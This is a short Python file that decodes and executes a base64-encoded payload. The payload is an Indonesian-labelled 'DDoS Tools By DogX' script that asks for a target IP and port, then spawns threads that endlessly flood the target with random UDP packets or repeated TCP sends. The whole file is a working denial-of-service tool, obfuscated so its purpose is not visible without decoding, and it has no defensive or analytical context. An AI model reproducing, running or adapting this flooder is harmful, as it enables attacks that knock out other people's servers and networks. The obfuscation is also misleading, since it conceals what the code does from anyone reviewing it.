import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KI0thZ2FrIFVzYWggUmVuYW1lIEJZIEJ5IERvZ1ggDQojRGRvcyBieSBEb2dYIHwgU1VCU0NSSUJFIFRPRCBDSEFOTkVMIERvZ3gNCmltcG9ydCByYW5kb20NCmltcG9ydCBzb2NrZXQNCmltcG9ydCB0aHJlYWRpbmcNCmltcG9ydCBvcw0KDQpvcy5zeXN0ZW0oImNsZWFyIikNCnByaW50KCJERG9TIFRvb2xzIEJ5IERvZ1giKQ0KcHJpbnQoIkthbG8gVGVtYnVzIEphbmdhbiBBYnVzZSBLb250b2wiKQ0KaXAgPSBzdHIoaW5wdXQoIiBJcDogIikpDQpwb3J0ID0gaW50KGlucHV0KCIgUG9ydDogIikpDQpjaG9pY2UgPSBzdHIoaW5wdXQoIiBNYXJpIEtpcmltIFBha2V0PyEhKHkvbik6ICIpKQ0KdGltZXMgPSBpbnQoaW5wdXQoIiBQYWtldCBZYW5nIE1hdSBMdSBraXJpbTogIikpDQp0aHJlYWRzID0gaW50KGlucHV0KCIgVGhlYXJkczogIikpDQpkZWYgcnVuKCk6DQogIGRhdGEgPSByYW5kb20uX3VyYW5kb20oMTAyNCkNCiAgaSA9IHJhbmRvbS5jaG9pY2UoKCJbKl0iLCJbIV0iLCJbI10iKSkNCiAgd2hpbGUgVHJ1ZToNCiAgICB0cnk6DQogICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pDQogICAgICBhZGRyID0gKHN0cihpcCksaW50KHBvcnQpKQ0KICAgICAgZm9yIHggaW4gcmFuZ2UodGltZXMpOg0KICAgICAgICBzLnNlbmR0byhkYXRhLGFkZHIpDQogICAgICBwcmludChpICsiIHwgUFVOVEVOIFBBS0VUISEhfCIpDQogICAgZXhjZXB0Og0KICAgICAgcHJpbnQoIlshXSB8IFBVTlRFTiBQQUtFVCEhISB8IikNCg0KZGVmIHJ1bjIoKToNCiAgZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgxNikNCiAgaSA9IHJhbmRvbS5jaG9pY2UoKCJbKl0iLCJbIV0iLCJbI10iKSkNCiAgd2hpbGUgVHJ1ZToNCiAgICB0cnk6DQogICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KICAgICAgcy5jb25uZWN0KChpcCxwb3J0KSkNCiAgICAgIHMuc2VuZChkYXRhKQ0KICAgICAgZm9yIHggaW4gcmFuZ2UodGltZXMpOg0KICAgICAgICBzLnNlbmQoZGF0YSkNCiAgICAgIHByaW50KGkgKyIgTUFOVEFQIEtBV0FOISEhIikNCiAgICBleGNlcHQ6DQogICAgICBzLmNsb3NlKCkNCiAgICAgIHByaW50KCJbKl0gRG93biIpDQoNCmZvciB5IGluIHJhbmdlKHRocmVhZHMpOg0KICBpZiBjaG9pY2UgPT0gJ3knOg0KICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSBydW4pDQogICAgdGguc3RhcnQoKQ0KICBlbHNlOg0KICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSBydW4yKQ0KICAgIHRoLnN0YXJ0KCk='))